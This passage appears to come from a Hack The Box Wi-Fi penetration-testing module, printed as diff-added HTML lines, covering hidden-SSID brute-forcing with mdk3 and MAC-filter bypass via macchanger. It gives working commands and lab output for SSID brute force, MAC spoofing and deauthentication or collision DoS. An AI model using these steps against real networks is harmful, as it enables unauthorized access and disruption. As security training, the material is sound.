+CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 0 </span>s ][ 2024-05-21 20:45 
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ B2:C1:3D:3B:2B:A1  -47  <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 9 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK  jacklighters
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29   <span class="hljs-number"> 0 </span>-24     <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 4 </span>        jacklighters
+</code></pre>
+<hr>
+<h4 id="bruteforcing-hidden-ssid">Bruteforcing Hidden SSID</h4>
+<p>Another way to discover a hidden SSID is to perform a brute-force attack. We can use a tool like <a href="https://github.com/charlesxsh/mdk3-master">mdk3</a> to carry out this attack. With mdk3, we can either provide a wordlist or specify the length of the SSID so the tool can automatically generate potential SSID names.</p>
+<p>Basic syntax for mdk3 is as following:</p>
+<p>Code: usage</p>
+<pre><code class="lang-usage">mdk3 <span class="hljs-symbol">&lt;interface&gt;</span> &lt;test <span class="hljs-keyword">mode</span>&gt; [test_ <span class="hljs-keyword">options</span>]
+</code></pre>
+<p>The <code>p</code> test mode argument in mdk3 stands for Basic probing and ESSID Bruteforce mode. It offers the following options:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Option</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-e</code></td>
+<td>Specify the SSID for probing.</td>
+</tr>
+<tr>
+<td><code>-f</code></td>
+<td>Read lines from a file for brute-forcing hidden SSIDs.</td>
+</tr>
+<tr>
+<td><code>-t</code></td>
+<td>Set the MAC address of the target AP.</td>
+</tr>
+<tr>
+<td><code>-s</code></td>
+<td>Set the speed (Default: unlimited, in Bruteforce mode: 300).</td>
+</tr>
+<tr>
+<td><code>-b</code></td>
+<td>Use full brute-force mode (recommended for short SSIDs only). This switch is used to show its help screen</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Bruteforcing all possible values</strong></p>
+<p>To bruteforce with all possible values, we can use <code>-b</code> as the <code>test_option</code> in mdk3. We can set the following options for it.</p>
+<ul>
+<li>upper case (u)</li>
+<li>digits (n)</li>
+<li>all printed (a)</li>
+<li>lower and upper case (c)</li>
+<li>lower and upper case plus numbers (m)</li>
+</ul>
+<p>  Finding Hidden SSIDs</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo mdk3 wlan0mon p -b u -c <span class="hljs-number">1</span> -t <span class="hljs-string">A2:</span><span class="hljs-string">FF:</span><span class="hljs-number">31</span>:<span class="hljs-number">2</span><span class="hljs-string">C:</span><span class="hljs-string">B1:</span>C4
+
+SSID Bruteforce Mode activated!
+
+
+channel set <span class="hljs-string">to:</span> <span class="hljs-number">1</span>
+Waiting <span class="hljs-keyword">for</span> beacon frame from target...
+
+
+SSID is hidden. SSID Length <span class="hljs-string">is:</span> <span class="hljs-number">4.</span>
+Sniffer thread started
+
+Got response from <span class="hljs-string">A2:</span><span class="hljs-string">FF:</span><span class="hljs-number">31</span>:<span class="hljs-number">2</span><span class="hljs-string">C:</span><span class="hljs-string">B1:</span>C4, <span class="hljs-string">SSID:</span> <span class="hljs-string">"WIFI"</span>
+Last <span class="hljs-keyword">try</span> <span class="hljs-string">was:</span> WIFI
+</code></pre>
+<p><strong>Bruteforcing using a Wordlist</strong></p>
+<p>To bruteforce using a wordlist we can use <code>-f</code> as the <code>test_option</code> in mdk3 followed by the location of the wordlist.</p>
+<p>  Finding Hidden SSIDs</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo mdk3 wlan0mon p -f /</span>opt/wordlist.txt -t <span class="hljs-string">D2:</span><span class="hljs-string">A3:</span><span class="hljs-number">32</span>:<span class="hljs-number">13</span>:<span class="hljs-number">29</span>:D5
+
+SSID Wordlist Mode activated!
+
+Waiting <span class="hljs-keyword">for</span> beacon frame from target...
+Sniffer thread started
+
+SSID is hidden. SSID Length <span class="hljs-string">is:</span> <span class="hljs-number">8.</span>
+
+Got response from <span class="hljs-string">D2:</span><span class="hljs-string">A3:</span><span class="hljs-number">32</span>:<span class="hljs-number">1</span><span class="hljs-string">B:</span><span class="hljs-number">29</span>:D5, <span class="hljs-string">SSID:</span> <span class="hljs-string">"HTB-Wifi"</span>
+</code></pre>
+<p>With the new discovery of the SSIDs, if we had the PSK or were able to gather it through some means, we would be able to connect to the network in question. In the next section, we will dive into an additional basic control that access points might possess, which is MAC filtering (whitelisting).</p>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In this section, we examined how to find hidden SSIDs using various methods, including deauthentication attacks and brute-forcing techniques. These methods revealed the processes and strategies for uncovering networks that are not openly visible, and provided a foundation for understanding network visibility and security.</p>
+<p>In the upcoming section, we will explore a different basic control bypass technique: bypassing MAC filtering. MAC filtering is a security measure used to permit or deny access to a network based on the MAC addresses of devices. By the end of this section, we will have a thorough understanding of MAC filtering, how to effectively bypass it, and how to apply these techniques in real-world scenarios for network security evaluations.</p>
+<hr>
+<h2 id="bypassing-mac-filtering">Bypassing Mac Filtering</h2>
+<hr>
+<p>Bypassing MAC filtering in Wi-Fi networks is a technique used to circumvent a basic security measure that many wireless routers implement. MAC filtering involves allowing only devices with specific MAC (Media Access Control) addresses to connect to the network. While this adds a layer of security by restricting access to known devices, it is not foolproof. Skilled individuals can exploit weaknesses in this system to gain unauthorized access. This process typically involves MAC address spoofing, where an attacker changes their device's MAC address to match an allowed device, thereby gaining access to the network.</p>
+<p>Suppose we're attempting to connect to a network with MAC filtering enabled. Knowing the password might not be sufficient if our MAC address is not authorized. Fortunately, we can usually overcome this obstacle through MAC spoofing, allowing us to bypass the filtering and gain access to the network.</p>
+<p>First, we would want to scout out our network with airodump-ng.</p>
+<p><strong>Scanning Available Wifi Networks</strong></p>
+<p>  Bypassing Mac Filtering</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng wlan0mon
+
+ CH <span class="hljs-number"> 37 </span>][ Elapsed:<span class="hljs-number"> 3 </span>mins ][ 2024-05-18 22:14  ][ WPA handshake: 52:CD:8C:79:AD:87
+
+ BSSID              PWR  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ 52:CD:8C:79:AD:87  -47     <span class="hljs-number"> 407 </span>    <span class="hljs-number"> 112 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK  HTB-Wireless                              
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ 52:CD:8C:79:AD:87  3E:48:72:B7:62:2A  -29   <span class="hljs-number"> 0 </span>-<span class="hljs-number"> 1 </span>   <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 68 </span>        HTB-Wireless
+ 52:CD:8C:79:AD:87  2E:EB:2B:F0:3C:4D  -29   <span class="hljs-number"> 0 </span>-<span class="hljs-number"> 9 </span>   <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 78 </span> EAPOL  HTB-Wireless
+ 52:CD:8C:79:AD:87  1A:50:AD:5A:13:76  -29   <span class="hljs-number"> 0 </span>-<span class="hljs-number"> 1 </span>   <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 88 </span> EAPOL  HTB-Wireless
+ 52:CD:8C:79:AD:87  46:B6:67:4F:50:32  -29   <span class="hljs-number"> 0 </span>-36    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 90 </span> EAPOL  HTB-Wireless
+</code></pre>
+<p>From the output, we can see that the ESSID <code>HTB-Wireless</code> is available on <code>channel 1</code> and has multiple clients connected to it. Suppose we have obtained the credentials for the <code>HTB-Wireless</code> WiFi network, with the password <code>Password123!!!!!!</code>. Despite having the correct login details, our connection attempts are thwarted by MAC filtering enforced by the network. This security measure restricts access to only authorized devices based on their MAC addresses. As a result, even with the correct password, our device is unable to establish a connection to the network.</p>
+<p>To bypass the MAC filtering, we can spoof our MAC address to match one of the connected clients. However, this approach often leads to collision events, as two devices with the same MAC address cannot coexist on the same network simultaneously.</p>
+<p>A more effective method would be to either forcefully disconnect the legitimate client through deauthentication attacks, thereby freeing up the MAC address for use, or to wait for the client to disconnect naturally. This strategy is particularly effective in "bring your own device" (BYOD) networks, where devices frequently connect and disconnect.</p>
+<p>Occasionally, when configuring our MAC address to match that of a client or access point, we may encounter collision events at the data-link layer. This technique of bypassing MAC filtering is most effective when the client we're mimicking is not currently connected to our target network. However, there are instances where these collision events become advantageous to us, serving as a means of denial-of-service (DOS) attack. In the case of a <code>dual-band</code> or <code>multiple access point network</code>, we may be able to utilize a MAC address of a client connected to a separate access point within the same wireless infrastructure.</p>
+<p>We can also check if there is a 5 GHz band available for the ESSID. If the 5 GHz band is available, we can attempt to connect to the network using that frequency, which would avoid collision events since most clients are connected to the 2.4 GHz band.</p>
+<p><strong>Scanning Networks Running on 5Ghz Band</strong></p>
+<p>  Bypassing Mac Filtering</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng wlan0mon --band a
+
+ CH <span class="hljs-number"> 48 </span>][ Elapsed:<span class="hljs-number"> 3 </span>mins ][ 2024-05-18 22:14  ][ WPA handshake: 52:CD:8C:79:AD:87
+
+ BSSID              PWR  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ 52:CD:8C:79:AD:87  -28      <span class="hljs-number"> 11 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 48 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK  HTB-Wireless-5G                              
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ (not associated)   3E:48:72:B7:62:2A  -29   <span class="hljs-number"> 0 </span>-<span class="hljs-number"> 1 </span>   <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 6 </span>         HTB-Wireless
+ (not associated)   2E:EB:2B:F0:3C:4D  -29   <span class="hljs-number"> 0 </span>-<span class="hljs-number"> 1 </span>   <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 9 </span>         HTB-Wireless
+ (not associated)   1A:50:AD:5A:13:76  -29   <span class="hljs-number"> 0 </span>-<span class="hljs-number"> 1 </span>   <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 7 </span>         HTB-Wireless
+ (not associated)   46:B6:67:4F:50:32  -29   <span class="hljs-number"> 0 </span>-<span class="hljs-number"> 1 </span>   <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 12 </span>        HTB-Wireless
+</code></pre>
+<p>From the above output, we can confirm that the ESSID <code>HTB-Wireless-5G</code> with the same BSSID is also operating on the <code>5 GHz</code> band. Since no clients are currently connected to the 5 GHz band, we can spoof our MAC address using tools such as <a href="https://github.com/alobbs/macchanger">macchanger</a> to match one of the clients connected to the 2.4 GHz band and connect to the 5 GHz network without any collision events.</p>
+<p>Before changing our MAC address, let's stop the monitor mode on our wireless interface.</p>
+<p>  Bypassing Mac Filtering</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo airmon-ng stop wlan0mon
+</code></pre>
+<p><img src="storage\modules\222\bypass_mac\bypass_mac_1.png" alt="Wi-Fi menu showing networks: HTB-Wireless and HTB-Wireless-5G, with options for VPN Connections and enabling Wi-Fi."></p>
+<p>Let's check our current MAC address before changing it. We can do this by running the following command in the terminal.</p>
+<p>  Bypassing Mac Filtering</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo macchanger wlan0
+
+Current <span class="hljs-string">MAC:</span>   <span class="hljs-number">00</span>:<span class="hljs-string">c0:</span><span class="hljs-string">ca:</span><span class="hljs-number">98</span>:<span class="hljs-number">3</span><span class="hljs-string">e:</span>e0 (ALFA, INC.)
+Permanent <span class="hljs-string">MAC:</span> <span class="hljs-number">00</span>:<span class="hljs-string">c0:</span><span class="hljs-string">ca:</span><span class="hljs-number">98</span>:<span class="hljs-number">3</span><span class="hljs-string">e:</span>e0 (ALFA, INC.)
+</code></pre>
+<p>As shown in the output, our Current MAC address and Permanent MAC address are <code>00:c0:ca:98:3e:e0</code>. Let's use <code>macchanger</code> to change our MAC address to match one of the clients connected to the 2.4 GHz network, specifically <code>3E:48:72:B7:62:2A</code>. This process involves disabling the <code>wlan0</code> interface, executing the <code>macchanger</code> command to adjust the MAC address, and finally reactivating the <code>wlan0</code> interface. Following these steps will effectively synchronize our device's MAC address with the specified client's address on the 2.4 GHz network.</p>
+<p><strong>Disable wlan0 interface</strong></p>
+<p>  Bypassing Mac Filtering</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo ifconfig wlan0 down
+</code></pre>
+<p><strong>Change the MAC address</strong></p>
+<p>  Bypassing Mac Filtering</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo macchanger wlan0 -m <span class="hljs-number">3</span><span class="hljs-string">E:</span><span class="hljs-number">48</span>:<span class="hljs-number">72</span>:<span class="hljs-string">B7:</span><span class="hljs-number">62</span>:<span class="hljs-number">2</span>A
+
+Current <span class="hljs-string">MAC:</span>   <span class="hljs-number">00</span>:<span class="hljs-string">c0:</span><span class="hljs-string">ca:</span><span class="hljs-number">98</span>:<span class="hljs-number">3</span><span class="hljs-string">e:</span>e0 (ALFA, INC.)
+Permanent <span class="hljs-string">MAC:</span> <span class="hljs-number">00</span>:<span class="hljs-string">c0:</span><span class="hljs-string">ca:</span><span class="hljs-number">98</span>:<span class="hljs-number">3</span><span class="hljs-string">e:</span>e0 (ALFA, INC.)
+New <span class="hljs-string">MAC:</span>       <span class="hljs-number">3</span><span class="hljs-string">e:</span><span class="hljs-number">48</span>:<span class="hljs-number">72</span>:<span class="hljs-string">b7:</span><span class="hljs-number">62</span>:<span class="hljs-number">2</span>a (unknown)
+</code></pre>
+<p><strong>Enable wlan0 interface</strong></p>
+<p>  Bypassing Mac Filtering</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo ifconfig wlan0 up
+</code></pre>
+<p>After bringing the wlan0 interface back up, we can utilize the <code>ifconfig</code> command to confirm that our MAC address has indeed been modified. This step ensures that our device now adopts the new MAC address we specified earlier, aligning with the desired client's MAC address connected to the 2.4 GHz network.</p>
+<p>  Bypassing Mac Filtering</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ifconfig wlan0
+
+wlan0: flags=4099&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        ether 3e:48:72:b7:62:2a  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)
+        RX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)
+        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
+        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)
+        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0
+</code></pre>
+<p>Now that our MAC address has been changed to match one of the clients connected to the 2.4 GHz network, we can proceed to connect to the 5 GHz WiFi network named <code>HTB-Wireless-5G</code>. This can be done either through the graphical user interface (GUI) of the system's network manager or via the command line using tools like NetworkManager's command-line interface (nmcli).</p>
+<p><img src="storage\modules\222\bypass_mac\bypass_mac_2.png" alt="Wi-Fi authentication prompt for network 'HTB-Wireless-5G' showing password entry field with 'Password123!!!!!!' and 'Show password' option."></p>
+<p><img src="storage\modules\222\bypass_mac\bypass_mac_3.png" alt="Notification showing 'Connection Established' to Wi-Fi network 'HTB-Wireless-5G' with option to dismiss message."></p>
+<p>After successfully connecting to the 5 GHz network, we can verify the connection status by running the <code>ifconfig</code> command once more. This time, we should observe that a DHCP-assigned IP address has been allocated by the WiFi network.</p>
+<p>  Bypassing Mac Filtering</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ifconfig
+
+wlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.2.73  netmask 255.255.255.0  broadcast 192.168.0.255
+        ether 2e:87:ba:cf:b7:53  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)
+        RX packets<span class="hljs-number"> 565 </span> bytes<span class="hljs-number"> 204264 </span>(199.4 KiB)
+        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
+        TX packets<span class="hljs-number"> 32 </span> bytes<span class="hljs-number"> 4930 </span>(4.8 KiB)
+        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0
+</code></pre>
+<p>Once connected to the WiFi network, we can scan for other clients connected to the same network within the IP range.</p>
+<hr>
+<h3 id="closing-thoughts">Closing Thoughts</h3>
+<p>Wi-Fi penetration testing is a critical skill for assessing and improving network security. The basics we’ve covered in this module provide a strong starting point. We explored how to connect to Wi-Fi networks using both GUI and CLI, use the aircrack-ng suite to perform different attacks, and discover hidden SSIDs. Additionally, we discussed changing interface modes, adjusting signal strength and frequencies, and bypassing MAC filters to overcome access restrictions. These tools and techniques offer a solid introduction to wireless security, setting the stage for deeper exploration and advanced skills.</p>
+<p>Mastering these fundamentals will empower you to not only identify vulnerabilities but also to take proactive steps in securing Wi-Fi networks. As you continue exploring, remember that each network presents unique challenges, and honing your skills through practice is the best way to stay ahead in this dynamic field. Keep pushing the boundaries, and soon, more advanced techniques will become second nature.</p>
+<hr>
+</div></body></html>
